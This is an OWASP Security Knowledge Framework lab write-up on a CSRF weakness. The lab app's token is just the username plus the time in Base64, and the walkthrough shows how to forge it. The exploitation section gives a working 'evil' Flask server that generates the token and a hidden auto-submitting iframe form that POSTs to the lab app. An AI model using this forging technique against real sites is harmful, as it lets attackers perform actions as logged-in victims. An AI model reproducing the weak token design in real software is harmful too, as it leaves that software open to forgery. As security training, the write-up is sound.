# CSRF - Weak

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:csrf-weak
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:csrf-weak
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf. For most sites, browser requests automatically include any credentials associated with the site, such as the user's session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the attacker and a legitimate request sent by the victim.

CSRF attacks target functionality that causes a state change / data mutation on the server, such as changing the victim's email address or password, or purchasing something. Forcing the victim to retrieve data doesn't benefit an attacker because the attacker doesn't receive the response, the victim does. As such, CSRF attacks target state-changing requests.

It's sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called "stored CSRF flaws". This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already.

Lets start the application and login with the default credentials.

```
username : admin
password: admin
```

![](../../.gitbook/assets/python/CSRF-Weak/1.png)

When we are loggedin to the application we can see that we can set our favorite color and this will be stored in the session of the user.

![](../../.gitbook/assets/python/CSRF-Weak/2.png)

If we inspect the request with an intercepting proxy we can see that the application is performing a POST request that results in a data mutation, storing our favorite color into the session of the user and displaying this back to the user in the HTML website.

![](../../.gitbook/assets/python/CSRF-Weak/3.png)

Also we can see that the application is using a csrf_token

```html
    <form method="post" action="/update">
        <input type="hidden" class="form-control" name="csrf_token" value="<%=csrf_token %>">
        <input type="text" class="form-control" name="color" placeholder="favorite color"/><br/>
        <button class="btn btn-primary" type="submit">Submit Button</button></div>
    </form>
```

Looks like it's Base64 encoded, let's first decoded the URL-encoded format then base64 decode:

![](../../.gitbook/assets/python/CSRF-Weak/4.png)

The csrf token is simply username + time.

Checking the application code we can how this csrf_token is being implemented.

```
    time = strftime("%H:%M", gmtime())
    csrf = request.form['username'] + time
    session['csrf_token'] = base64.b64encode(csrf.encode())
    csrf_token = str(session['csrf_token'], 'utf-8')
```

## Exploitation

In order to to exploit this vulnerability we need to set up our evil webserver to do the malicious CSRF using a POST request from and sending the weak csrf_token with. We could achieve this by creating the following python flask application:

```python
import base64
from time import gmtime, strftime
from flask import Flask, request, url_for, render_template, redirect, make_response

app = Flask(__name__, static_url_path='/static', static_folder='static')

app.config['DEBUG'] = True

@app.route("/")
def start():
    time = strftime("%H:%M", gmtime())
    csrf = "admin" + time
    csrf_raw = base64.b64encode(csrf.encode())
    csrf_token = str(csrf_raw, 'utf-8')
    return render_template("evil.html", csrf_token = csrf_token)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```

Save the snippet above to &gt; evil_server.py and run the commands below to install some dependencies.

```text
$ pip3 install flask
```

Of course you can also run your app on whatever service you want it does not have to be python flask.

Now that the service is running we want to serve the malicious piece of javascript that is responsible for performing the malicious CSRF POST request.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form
  method="POST"
  action="http://localhost:5000/update"
  target="csrf-frame"
  id="csrf-form"
>
  <input type="hidden" name="csrf_token" value="<%= csrf_token %>" />
  <input type="hidden" name="color" value="Hackzord!" />
  <input type="submit" value="submit" />
</form>
<script>
  document.getElementById("csrf-form").submit();
</script>
```

Save the snippet above to &gt; templates/evil.html and run the command below to start our evil application.

```text
$ python3 evil_server.py
```

Now when we have in the browser tab our active session of the application we can open a new tab where we will load our evil page we just created.

```text
http://localhost:1337/
```

![](../../.gitbook/assets/python/CSRF-Weak/5.png)

This will now create a POST request to the application and changing the value of blue to the new value of 'Hackzord!' As you can see the Referer is set to our evil website where the request originated from and we have our forged csrf_token with the request.

![](../../.gitbook/assets/python/CSRF-Weak/6.png)

Also when we refresh the original page of the application we can see that the new vaulue has been replaced with the content of our evil app.

![](../../.gitbook/assets/python/CSRF-Weak/7.png)

## Additional sources

{% embed url="https://owasp.org/www-community/attacks/csrf" %}
